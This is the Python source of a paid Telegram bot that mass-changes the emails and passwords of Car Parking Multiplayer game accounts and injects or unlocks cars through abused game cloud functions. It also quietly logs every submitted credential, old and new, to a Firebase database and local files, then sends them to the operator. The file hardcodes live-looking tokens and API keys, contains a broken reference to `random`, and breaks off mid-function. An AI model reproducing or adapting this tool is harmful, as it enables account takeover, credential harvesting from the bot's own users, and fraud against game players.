import json, time, re, os, random as rnd, asyncio, aiohttp, logging, sys, signal, socket, zipfile, threading, glob
from datetime import datetime, timedelta, timezone
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.request import HTTPXRequest
from telegram.error import NetworkError, TimedOut, BadRequest
from flask import Flask

# ============================================================
# ✅ FLASK APP
# ============================================================
app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return "🤖 MARK CPM1/2 CHANGER BOT - RUNNING 24/7!"

@app_flask.route('/health')
def health():
    return "OK"

# ============================================================
# ✅ CONFIGURATION
# ============================================================
TOKEN = "8803500377:AAE0bT-ReEKxTPXPHEbUO3ff80OLYbKF4Wg"
ADMIN_ID = 6531314640
GROUP_ID = -1004441134033

FIREBASE_API_KEY = "ph2yty6YZsJCU4oOFZi901HN4sGo7Ehtie94p7KX"
DB_URL = "https://cpm2bpt-default-rtdb.europe-west1.firebasedatabase.app"

GAME_AUTH_KEYS = {
    "cpm1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
    "cpm2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

# ============================================================
# ✅ CUSTOM EMOJI MAPPING (COMPLETE)
# ============================================================
CUSTOM_EMOJI_MAP = {
    '😂': '5406913184810409829', '😄': '5386587088873331829',
    '😍': '5323470315370585285', '😭': '5379656338802482888',
    '🤑': '5427107837568360763', '👑': '5938534225140519372',
    '🔥': '6001061381237903602', '⚡': '6100289024289672793',
    '💎': '6064293500382350516', '❌': '6064642968986323772',
    '🤨': '6134245834595765950', '👹': '6142914800880979809',
    '👀': '5834733550020072624', '💙': '6269557847248342937',
    '⚠️': '6100590432209604692', '😆': '5375135722514685501',
    '😮': '5456662929166309849', '😎': '5195360348693078341',
    '👤': '5258011929993026890', '🎮': '5258508428212445001',
    '🚘': '5366286487862124799', '✅': '5197288647275071607',
    '🎉': '6001197385672298829', '📁': '5357315181649076022',
    '📊': '5192886773948107844', '⏳': '5192988444413938411',
    '🚀': '5190768392998504411', '💰': '5192683149548605430',
    '📲': '5192998636371330526',
    '💃': '5373112999076699207', '😠': '5348119373200506812',
    '😡': '5251301176737013980', '🦁': '5980821811711972473',
    '☑️': '5936230155574842929', '👌': '6001451188174723066',
    '🗿': '6001226634399585063', '🚗': '5375593780776805206',
    '🏎': '5391327195169831190', '😌': '5958585443170651565',
    '⚡1': '6100277122935295595', '⚡2': '6100472578307002133',
    '⚡3': '6102404476071579522', '⚡4': '6100671388048166850',
    '⚡5': '6100278127957643014',
    '🥵': '6307832826263768178',  # ADMIN-ONLY – may fallback
}

def get_custom_entities(text):
    entities = []
    offset = 0
    i = 0
    while i < len(text):
        # Check for multi-character emojis
        if i + 1 < len(text) and text[i:i+2] in ['☑️', '✔️', '⚡1', '⚡2', '⚡3', '⚡4', '⚡5']:
            ch = text[i:i+2]
            utf16_len = 2
            i += 2
        else:
            ch = text[i]
            utf16_len = len(ch.encode('utf-16-le')) // 2
            i += 1
        
        if ch in CUSTOM_EMOJI_MAP:
            entities.append(MessageEntity(
                type="custom_emoji",
                offset=offset,
                length=utf16_len,
                custom_emoji_id=CUSTOM_EMOJI_MAP[ch]
            ))
        offset += utf16_len
    return entities

async def send_custom(chat_id, text, context, reply_markup=None):
    entities = get_custom_entities(text)
    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=None,
            entities=entities if entities else None
        )
    except Exception as e:
        # Fallback: send without custom entities (prevents crash)
        print(f"⚠️ Custom emoji error: {e}. Sending without entities.")
        await context.bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=None
        )

async def reply_custom(update, text, context, reply_markup=None):
    await send_custom(update.effective_chat.id, text, context, reply_markup)

async def edit_custom(query, text, reply_markup=None):
    entities = get_custom_entities(text)
    try:
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode=None,
            entities=entities if entities else None
        )
    except Exception as e:
        if "Message is not modified" in str(e):
            pass
        else:
            try:
                await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode=None)
            except:
                pass

# ============================================================
# ✅ LOGGING
# ============================================================
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# ============================================================
# ✅ FIREBASE HELPERS
# ============================================================
def db_put(path, data):
    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
    return requests.put(url, json=data).status_code in (200, 204)

def db_get(path, limit=None):
    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
    if limit:
        url += f'&orderBy="$key"&limitToLast={limit}'
    r = requests.get(url, timeout=30)
    return r.json() if r.status_code == 200 else None

def db_delete(path):
    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
    return requests.delete(url).status_code in (200, 204)

def db_push(path, data):
    url = f"{DB_URL}/{path}.json?auth={FIREBASE_API_KEY}"
    r = requests.post(url, json=data, timeout=15)
    return r.status_code in (200, 204)

# ============================================================
# ✅ LOCAL LOG FILES
# ============================================================
CREDENTIALS_BACKUP_CPM1 = "credentials_backup_cpm1.txt"
CREDENTIALS_BACKUP_CPM2 = "credentials_backup_cpm2.txt"
DETAILED_CHANGES_CPM1   = "detailed_changes_cpm1.txt"
DETAILED_CHANGES_CPM2   = "detailed_changes_cpm2.txt"
KEYS_LOG_FILE = "keys_log.json"
BULK_COUNTER_FILE = "bulk_counter.json"

def append_credentials_backup(email, password, game="cpm2"):
    filename = CREDENTIALS_BACKUP_CPM1 if game == "cpm1" else CREDENTIALS_BACKUP_CPM2
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"{email}:{password}\n")
    except: pass

def append_detailed_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game="cpm2"):
    filename = DETAILED_CHANGES_CPM1 if game == "cpm1" else DETAILED_CHANGES_CPM2
    entry = (
        f"--- Change on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
        f"Type: {change_type}\n"
        f"Old Email: {old_email}\n"
        f"New Email: {new_email}\n"
        f"Old Password: {old_password}\n"
        f"New Password: {new_password}\n"
        f"Changed by: @{username} (ID: {user_id})\n"
        "---------------------------------------------\n"
    )
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(entry)
    except: pass

def log_key_event(user_id, key_type, action="added", admin_id=None):
    entry = {
        "user_id": user_id,
        "key_type": key_type,
        "action": action,
        "admin_id": admin_id,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    try:
        with open(KEYS_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry) + "\n")
    except: pass

def get_next_bulk_number():
    try:
        with open(BULK_COUNTER_FILE, "r") as f:
            data = json.load(f)
            num = data.get("counter", 0) + 1
    except:
        num = 1
    with open(BULK_COUNTER_FILE, "w") as f:
        json.dump({"counter": num}, f)
    return num

# ============================================================
# ✅ CLOUD LOG FUNCTIONS
# ============================================================
def cloud_log_credentials(email, password, game="cpm2", change_type="", old_email="", username="", user_id=0):
    entry = {
        "email": email,
        "password": password,
        "game": game,
        "change_type": change_type,
        "old_email": old_email,
        "username": username,
        "user_id": user_id,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    db_push("logs/credentials", entry)
    append_credentials_backup(email, password, game)

def cloud_log_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game="cpm2"):
    entry = {
        "change_type": change_type,
        "old_email": old_email,
        "new_email": new_email,
        "old_password": old_password,
        "new_password": new_password,
        "username": username,
        "user_id": user_id,
        "game": game,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    db_push("logs/changes", entry)
    append_detailed_change(change_type, old_email, new_email, old_password, new_password, username, user_id, game)

def cloud_log_key_event(user_id, key_type, action="added", admin_id=None):
    entry = {
        "user_id": user_id,
        "key_type": key_type,
        "action": action,
        "admin_id": admin_id,
        "timestamp": datetime.now(timezone.utc).isoformat()
    }
    db_push("logs/keys", entry)
    log_key_event(user_id, key_type, action, admin_id)

# ============================================================
# ✅ FIRST TRIAL TRACKING
# ============================================================
def has_used_first_trial(user_id):
    data = db_get(f"first_trial/{user_id}")
    return data is not None

def mark_first_trial_used(user_id):
    db_put(f"first_trial/{user_id}", {"used": True, "timestamp": datetime.now(timezone.utc).isoformat()})

# ============================================================
# ✅ GET USER STATS
# ============================================================
def get_user_stats(user_id):
    logs = db_get("logs/credentials", limit=1000) or {}
    user_changes = 0
    for key, entry in logs.items():
        if entry.get("user_id") == user_id:
            user_changes += 1
    
    time_left = "N/A"
    if get_key(user_id):
        key_data = db_get(f"keys/{user_id}")
        if key_data and key_data.get("expiry"):
            expiry = datetime.fromisoformat(key_data["expiry"])
            remaining = expiry - datetime.now(timezone.utc)
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                if days > 0:
                    time_left = f"{days}d and {hours}h"
                else:
                    time_left = f"{hours}h and {minutes}m"
    elif has_trial(user_id):
        trial_data = db_get(f"trials/{user_id}")
        if trial_data and trial_data.get("expiry"):
            expiry = datetime.fromisoformat(trial_data["expiry"])
            remaining = expiry - datetime.now(timezone.utc)
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                if days > 0:
                    time_left = f"{days}d and {hours}h"
                else:
                    time_left = f"{hours}h and {minutes}m"
    
    return {"changes": user_changes, "time_left": time_left}

# ============================================================
# ✅ DASHBOARD COMMAND
# ============================================================
async def dashboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        all_users = db_get("users") or {}
        msg = "👑 ADMIN DASHBOARD 🔥\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        count = 0
        for uid, info in all_users.items():
            if count >= 20:
                msg += f"\n... and {len(all_users)-20} more users"
                break
            stats = get_user_stats(int(uid))
            username = info.get("username", "Unknown")
            msg += f"👤 ID: {uid}\n"
            msg += f"📛 Username: @{username}\n"
            msg += f"📊 Accounts Changed: {stats['changes']}\n"
            msg += f"⏰ Time Left: {stats['time_left']}\n"
            msg += "━━━━━━━━━━━━━━━━━━━━━\n"
            count += 1
        await reply_custom(update, msg, context)
        return
    
    if not has_access(user_id):
        await reply_custom(update, "🔒 Access Denied. You don't have a valid key or trial.", context)
        return
    
    stats = get_user_stats(user_id)
    username = update.effective_user.username or "NoUsername"
    msg = (
        f"📊 YOUR DASHBOARD\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 ID: {user_id}\n"
        f"👤 Username: @{username}\n"
        f"📊 Accounts Changed: {stats['changes']}\n"
        f"⏰ Time Left: {stats['time_left']}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📌 MARK CPM1/2 CHANGER TOOL"
    )
    await reply_custom(update, msg, context)

# ============================================================
# ✅ MAINTENANCE
# ============================================================
def set_maintenance(active, message="🛠️ Under maintenance. We'll be back shortly! 🚧"):
    db_put("maintenance", {"active": active, "message": message})

def get_maintenance():
    return db_get("maintenance") or {"active": False, "message": ""}

# ============================================================
# ✅ KEY MANAGEMENT
# ============================================================
DURATIONS = {
    "1week": timedelta(weeks=1),
    "1month": timedelta(days=30),
    "7weeks": timedelta(weeks=7),
    "3months": timedelta(days=90),
    "6months": timedelta(days=180)
}

PRICES = {
    "1week": (5, 200),
    "1month": (15, 550),
    "7weeks": (20, 750),
    "3months": (35, 2300),
    "6months": (75, 4600)
}

def add_key(user_id, key_type):
    if key_type not in DURATIONS: return False
    expiry = datetime.now(timezone.utc) + DURATIONS[key_type]
    db_put(f"keys/{user_id}", {"tier": key_type, "expiry": expiry.isoformat()})
    return True

def get_key(user_id):
    data = db_get(f"keys/{user_id}")
    if not data: return None
    expiry = datetime.fromisoformat(data["expiry"])
    if datetime.now(timezone.utc) >= expiry: return None
    return data["tier"]

def had_key(user_id):
    data = db_get(f"keys/{user_id}")
    return data is not None

# ============================================================
# ✅ TRIAL SYSTEM
# ============================================================
def add_trial(user_id, duration_str):
    try:
        parts = duration_str.upper().split()
        if len(parts) != 2:
            return False, "Invalid format. Use: '5 MINUTES', '2 HOURS', '3 DAYS'"
        amount = int(parts[0])
        unit = parts[1]
        if unit in ["MINUTE", "MINUTES"]:
            delta = timedelta(minutes=amount)
        elif unit in ["HOUR", "HOURS"]:
            delta = timedelta(hours=amount)
        elif unit in ["DAY", "DAYS"]:
            delta = timedelta(days=amount)
        else:
            return False, "Invalid unit."
        expiry = datetime.now(timezone.utc) + delta
        db_put(f"trials/{user_id}", {"expiry": expiry.isoformat()})
        return True, f"Trial until {expiry.strftime('%Y-%m-%d %H:%M:%S UTC')}"
    except Exception as e:
        return False, str(e)

def remove_trial(user_id):
    db_delete(f"trials/{user_id}")
    return True

def get_trial(user_id):
    data = db_get(f"trials/{user_id}")
    if not data: return None
    expiry = datetime.fromisoformat(data["expiry"])
    if datetime.now(timezone.utc) >= expiry:
        db_delete(f"trials/{user_id}")
        return None
    return expiry

def has_trial(user_id):
    return get_trial(user_id) is not None

def has_access(user_id):
    if get_key(user_id): return True
    if has_trial(user_id): return True
    return False

# ============================================================
# ✅ NOTIFICATION
# ============================================================
async def send_activation_notification(context, user_id, activation_type, plan_or_duration=""):
    if activation_type == "KEY":
        msg = (
            f"🔥 KEY ACTIVATED – LET'S GO! 🔥\n\n"
            f"Your {plan_or_duration.upper()} key is now ACTIVE!\n"
            "You're all set to dominate CPM1/2 with this beast of a tool.\n\n"
            "⚡ What you can do:\n"
            "✅ Change emails & passwords instantly\n"
            "✅ Bulk change thousands of accounts\n"
            "✅ 24/7 access – no limits\n\n"
            "👉 Use /start now and start cooking! 💪\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 MARK CPM1/2 CHANGER TOOL\n"
            "💸 Powered by @Maarkryan"
        )
    else:
        msg = (
            f"🎁 TRIAL ACTIVATED – TEST THE BEAST! 🎁\n\n"
            f"Your {plan_or_duration} trial is now ACTIVE!\n"
            "Experience the power of this changer tool – no strings attached.\n\n"
            "⚡ What you can test:\n"
            "✅ Change emails & passwords\n"
            "✅ Bulk change (limited to 1000 per batch)\n"
            "✅ Real-time processing\n\n"
            f"⏳ Your trial ends after: {plan_or_duration}\n"
            "👉 Use /start now and see the magic! 🚀\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 MARK CPM1/2 CHANGER TOOL\n"
            "💸 Buy full access: @Maarkryan"
        )
    try:
        await send_custom(chat_id=user_id, text=msg, context=context)
    except Exception as e:
        print(f"⚠️ Could not send notification: {e}")

# ============================================================
# ✅ SYNC AUTH
# ============================================================
def sign_in_game(email, password, game="cpm2"):
    api_key = GAME_AUTH_KEYS.get(game, GAME_AUTH_KEYS["cpm2"])
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
    try:
        r = requests.post(url, json={"email":email,"password":password,"returnSecureToken":True}, timeout=60)
        if r.status_code == 200:
            return r.json()["idToken"]
    except:
        pass
    return None

def change_email(token, new_email, game="cpm2"):
    api_key = GAME_AUTH_KEYS.get(game, GAME_AUTH_KEYS["cpm2"])
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
    try:
        r = requests.post(url, json={"idToken":token,"email":new_email,"returnSecureToken":True}, timeout=60)
        return r.status_code == 200
    except:
        return False

def change_password(token, new_password, game="cpm2"):
    api_key = GAME_AUTH_KEYS.get(game, GAME_AUTH_KEYS["cpm2"])
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
    try:
        r = requests.post(url, json={"idToken":token,"password":new_password,"returnSecureToken":True}, timeout=60)
        return r.status_code == 200
    except:
        return False

# ============================================================
# ✅ ASYNC AUTH
# ============================================================
async def async_sign_in_game(session, email, password, game="cpm2", max_retries=8):
    api_key = GAME_AUTH_KEYS.get(game, GAME_AUTH_KEYS["cpm2"])
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
    for attempt in range(max_retries):
        try:
            async with session.post(url, json={"email":email,"password":password,"returnSecureToken":True}, timeout=60) as resp:
                data = await resp.json()
                if resp.status == 200:
                    return data.get("idToken")
                else:
                    error_msg = data.get('error', {}).get('message', 'Unknown error')
                    print(f"❌ Sign-in failed: {error_msg}")
                    return None
        except Exception as e:
            print(f"⚠️ Network error (attempt {attempt+1}/{max_retries}): {e}")
            if attempt == max_retries - 1:
                return None
            await asyncio.sleep(2 * (attempt + 1))
    return None

async def async_change_email(session, token, new_email, game="cpm2", max_retries=8):
    api_key = GAME_AUTH_KEYS.get(game, GAME_AUTH_KEYS["cpm2"])
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
    for attempt in range(max_retries):
        try:
            async with session.post(url, json={"idToken":token,"email":new_email,"returnSecureToken":True}, timeout=60) as resp:
                return resp.status == 200
        except Exception as e:
            print(f"⚠️ Network error changing email (attempt {attempt+1}/{max_retries}): {e}")
            if attempt == max_retries - 1:
                return False
            await asyncio.sleep(2 * (attempt + 1))
    return False

async def async_change_password(session, token, new_password, game="cpm2", max_retries=8):
    api_key = GAME_AUTH_KEYS.get(game, GAME_AUTH_KEYS["cpm2"])
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
    for attempt in range(max_retries):
        try:
            async with session.post(url, json={"idToken":token,"password":new_password,"returnSecureToken":True}, timeout=60) as resp:
                return resp.status == 200
        except Exception as e:
            print(f"⚠️ Network error changing password (attempt {attempt+1}/{max_retries}): {e}")
            if attempt == max_retries - 1:
                return False
            await asyncio.sleep(2 * (attempt + 1))
    return False

# ============================================================
# ✅ SESSIONS & BULK TASK
# ============================================================
sessions = {}
bulk_tasks = {}

# ============================================================
# ✅ CPM1 TOOL FUNCTIONS
# ============================================================
ALL_CARS_DIR = 'all-cars'

def load_all_cars():
    cars = []
    if not os.path.exists(ALL_CARS_DIR):
        os.makedirs(ALL_CARS_DIR)
        return cars
    for filepath in sorted(glob.glob(f'{ALL_CARS_DIR}/*.json')):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                car = json.load(f)
                cars.append(car)
        except:
            pass
    return cars

async def login_async(session, e, p):
    K = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
    FB = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty'
    for url in [f'{FB}/verifyPassword', f'{FB}/signupNewUser']:
        try:
            async with session.post(url, params={'key': K}, json={
                'email': e, 'password': p, 'returnSecureToken': True
            }, timeout=aiohttp.ClientTimeout(total=12)) as r:
                d = await r.json()
                if d.get('idToken'):
                    return d['idToken'], d['localId']
        except:
            continue
    return None, None

async def api_async(session, tok, ep, data, timeout=8):
    EU = 'https://europe-west1-cp-multiplayer.cloudfunctions.net'
    h = {'Content-Type': 'application/json', 'Authorization': f'Bearer {tok}'}
    try:
        async with session.post(f'{EU}/{ep}', json={'data': data}, headers=h,
                               timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            text = await r.text()
            return r.status, text
    except:
        return 500, ''

async def get_world_sale_slots_fast(session, tok):
    _, t = await api_async(session, tok, 'WSGetCarListV3', 20, timeout=5)
    try:
        response_data = json.loads(t)
        if 'result' in response_data:
            lst = json.loads(response_data['result'])
            if lst:
                return lst
    except:
        pass
    return []

async def buy_car_from_slot(session, tok, slot, car):
    payload = {
        "ownerID": slot.get('ownerID', ''),
        "ownerName": slot.get('ownerName', ''),
        "description": slot.get('description', ''),
        "CarID": slot.get('carID', 0),
        "carGeneratedID": slot.get('carGeneratedID', ''),
        "ownerAccountID": slot.get('ownerAccountID', ''),
        "oneCar": car,
        "vynilOneCar": car.get('Vynils', {}),
        "loadedLocalCar": {"instanceID": random.randint(-999999, -100000)},
        "price": slot.get('price', 100),
        "SellingCar": {},
        "willReject": False,
        "dislike": 1,
        "like": 0,
        "liked": False,
        "disliked": False,
        "mode": 1,
    }
    _, t = await api_async(session, tok, 'WSPurchaseCarV3', json.dumps(payload), timeout=6)
    try:
        return json.loads(t).get('result') == 1
    except:
        return False

async def cpm1_unlock_async(email, pwd, callback=None):
    all_cars = load_all_cars()
    if not all_cars:
        return {"success": False, "message": "No car files found in all-cars/ folder"}
    
    cfg = {"batch_size": 50, "concurrency": 200, "buy_delay": 0.05, "slot_wait": 0.1}
    min_price = 0
    max_price = 10000
    total_cars = len(all_cars)
    
    connector = aiohttp.TCPConnector(limit=cfg["concurrency"], limit_per_host=cfg["concurrency"])
    async with aiohttp.ClientSession(connector=connector) as session:
        tok, uid = await login_async(session, email, pwd)
        if not tok:
            return {"success": False, "message": "Authentication failed"}
        
        total_unlocked = 0
        total_spent = 0
        car_index = 0
        unlocked_ids = set()
        last_progress = 0
        start_time = time.time()
        
        while total_unlocked < total_cars:
            slots = await get_world_sale_slots_fast(session, tok)
            if not slots:
                await asyncio.sleep(cfg["slot_wait"])
                continue
            
            valid_slots = []
            for slot in slots:
                slot_id = slot.get('carID', 0)
                slot_price = slot.get('price', 0)
                if slot_id in unlocked_ids:
                    continue
                if slot_price < min_price or slot_price > max_price:
                    continue
                valid_slots.append(slot)
            
            if not valid_slots:
                await asyncio.sleep(cfg["slot_wait"])
                continue
            
            remaining = total_cars - total_unlocked
            batch = valid_slots[:min(cfg["batch_size"], remaining)]
            
            tasks = []
            for slot in batch:
                car = all_cars[car_index % total_cars]
                car_index += 1
                new_car = json.loads(json.dumps(car))
                slot_id = slot.get('carID', 0)
                new_car['CarID'] = slot_id
                if 'texts' in new_car:
                    texts = new_car['texts']
                    if isinstance(texts, str):
                        texts = [texts, '', '']
                    while len(texts) <= 2:
                        texts.append('')
                    texts[2] = f'{uid[:8].upper()}_{slot_id}_HZ'
                    new_car['texts'] = texts
                if 'Vynils' in new_car and isinstance(new_car['Vynils'], dict):
                    new_car['Vynils']['CarID'] = slot_id
                tasks.append(buy_car_from_slot(session, tok, slot, new_car))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            batch_unlocked = 0
            batch_spent = 0
            for i, result in enumerate(results):
                if result is True:
                    batch_unlocked += 1
                    batch_spent += batch[i].get('price', 0)
                    unlocked_ids.add(batch[i].get('carID', 0))
            
            total_unlocked += batch_unlocked
            total_spent += batch_spent
            
            if total_unlocked - last_progress >= 20 or total_unlocked >= total_cars:
                elapsed = time.time() - start_time
                speed = total_unlocked / elapsed if elapsed > 0 else 0
                if callback:
                    await callback(total_unlocked, total_cars, total_spent, speed)
                last_progress = total_unlocked
            
            if total_unlocked >= total_cars:
                break
            
            await asyncio.sleep(cfg["buy_delay"])
        
        elapsed = time.time() - start_time
        return {
            "success": True,
            "unlocked": total_unlocked,
            "total": total_cars,
            "spent": total_spent,
            "time": elapsed,
            "speed": total_unlocked / elapsed if elapsed > 0 else 0
        }

async def cpm1_inject_async(email, pwd, cid):
    connector = aiohttp.TCPConnector(limit=20)
    async with aiohttp.ClientSession(connector=connector) as session:
        tok, uid = await login_async(session, email, pwd)
        if not tok:
            return {"success": False, "message": "Authentication failed"}
        
        _, t = await api_async(session, tok, 'GetAllCars2', None, timeout=8)
        try:
            response_data = json.loads(t)
            if 'result' not in response_data:
                return {"success": False, "message": "Cannot get cars"}
            cars = json.loads(response_data['result'])
        except:
            return {"success": False, "message": "Parse error"}
        
        if not cars:
            return {"success": False, "message": "No cars available"}
        
        tpl = max(cars, key=lambda c: c.get('CarID', 0))
        car = json.loads(json.dumps(tpl))
        if 'CarID' not in car:
            return {"success": False, "message": "Invalid car structure"}
        
        car['CarID'] = cid
        try:
            if 'texts' in car:
                texts = car['texts']
                if isinstance(texts, str):
                    car['texts'] = [texts, '', '']
                    texts = car['texts']
                elif not isinstance(texts, list):
                    pass
                else:
                    while len(texts) <= 2:
                        texts.append('')
                    car['texts'][2] = f'{uid[:8].upper()}_{cid}_HZ'
        except:
            pass
        
        try:
            if 'Vynils' in car and isinstance(car['Vynils'], dict):
                car['Vynils']['CarID'] = cid
        except:
            pass
        
        slots = await get_world_sale_slots_fast(session, tok)
        if not slots:
            return {"success": False, "message": "No slots available"}
        
        w = slots[0]
        success = await buy_car_from_slot(session, tok, w, car)
        
        if not success:
            return {"success": False, "message": "Injection rejected"}
        
        return {"success": True, "car_id": cid}

# ============================================================
# ✅ ADMIN COMMANDS
# ============================================================
async def addtrial_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    args = context.args
    if args is None or len(args) != 3:
        await reply_custom(update,
            "❌ Usage: /addtrial USER_ID DURATION\n\n"
            "Examples:\n"
            "/addtrial 123456789 5 MINUTES\n"
            "/addtrial 123456789 2 HOURS\n"
            "/addtrial 123456789 3 DAYS",
            context
        )
        return
    try:
        target_id = int(args[0])
        duration = f"{args[1]} {args[2]}"
        success, msg = add_trial(target_id, duration)
        if success:
            await reply_custom(update, f"✅ Trial added for user {target_id}\n📅 {msg}", context)
            await send_activation_notification(context, target_id, "TRIAL", duration)
        else:
            await reply_custom(update, f"❌ Failed: {msg}", context)
    except ValueError:
        await reply_custom(update, "❌ Invalid USER_ID.", context)

async def removetrial_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    args = context.args
    if args is None or len(args) != 1:
        await reply_custom(update, "❌ Usage: /removetrial USER_ID", context)
        return
    try:
        target_id = int(args[0])
        remove_trial(target_id)
        await reply_custom(update, f"✅ Trial removed for user {target_id}", context)
    except ValueError:
        await reply_custom(update, "❌ Invalid USER_ID.", context)

async def triallist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    data = db_get("trials") or {}
    if not data:
        await reply_custom(update, "📭 No active trials.", context)
        return
    msg = "📋 ACTIVE TRIALS:\n\n"
    for uid, info in data.items():
        expiry = info.get("expiry", "Unknown")
        remaining = datetime.fromisoformat(expiry) - datetime.now(timezone.utc)
        if remaining.total_seconds() > 0:
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            msg += f"👤 User {uid}: {days}d {hours}h {minutes}m remaining\n"
    await reply_custom(update, msg, context)

# ============================================================
# ✅ CONTINUE COMMAND
# ============================================================
async def continue_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    
    task_info = bulk_tasks.get(user_id)
    if not task_info:
        await reply_custom(update, "📭 No paused bulk change found.", context)
        return
    
    if task_info.get('status') == 'running':
        await reply_custom(update, "⏳ Bulk change is already running.", context)
        return
    
    if task_info.get('status') == 'completed':
        await reply_custom(update, "✅ Bulk change already completed.", context)
        return
    
    await reply_custom(update, "🔄 Resuming bulk change...", context)
    sessions[user_id] = task_info.get('session_data', {})
    sessions[user_id]['state'] = 'awaiting_bulk_new_value'
    asyncio.create_task(process_bulk_change(update, context, resume=True))

# ============================================================
# ✅ BACKUP FUNCTIONS
# ============================================================
async def backup_now_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    await reply_custom(update, "⏳ Creating backup... 📁", context)
    await send_backup_to_admin(context.bot, "📦 Manual Backup")
    await reply_custom(update, "✅ Backup sent! Check your DMs. 🔥", context)

async def send_backup_to_admin(bot, title="📦 Manual Backup"):
    try:
        cloud_logs = db_get("logs", limit=5000) or {}
        backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(backup_filename, "w", encoding="utf-8") as f:
            json.dump(cloud_logs, f, indent=2, ensure_ascii=False)
        with open(backup_filename, "rb") as f:
            await bot.send_document(
                chat_id=ADMIN_ID,
                document=f,
                caption=f"{title}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n✅ All logs from Firebase (last 5000 entries)."
            )
        local_files = [
            CREDENTIALS_BACKUP_CPM1,
            CREDENTIALS_BACKUP_CPM2,
            DETAILED_CHANGES_CPM1,
            DETAILED_CHANGES_CPM2
        ]
        for filename in local_files:
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    await bot.send_document(
                        chat_id=ADMIN_ID,
                        document=f,
                        caption=f"📎 {filename} (local backup)"
                    )
        os.remove(backup_filename)
        print(f"✅ Backup sent to admin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        print(f"❌ Backup failed: {e}")

# ============================================================
# ✅ DOWNLOAD LOGS
# ============================================================
async def download_logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    await reply_custom(update, "⏳ Fetching logs from cloud... 📊", context)
    cloud_logs = db_get("logs", limit=1000) or {}
    if not cloud_logs:
        await reply_custom(update, "📭 No logs found in cloud.", context)
        return
    total_credentials = len(cloud_logs.get("credentials", {}))
    total_changes = len(cloud_logs.get("changes", {}))
    total_keys = len(cloud_logs.get("keys", {}))
    last_entries = []
    if cloud_logs.get("credentials"):
        for key, val in list(cloud_logs["credentials"].items())[-10:]:
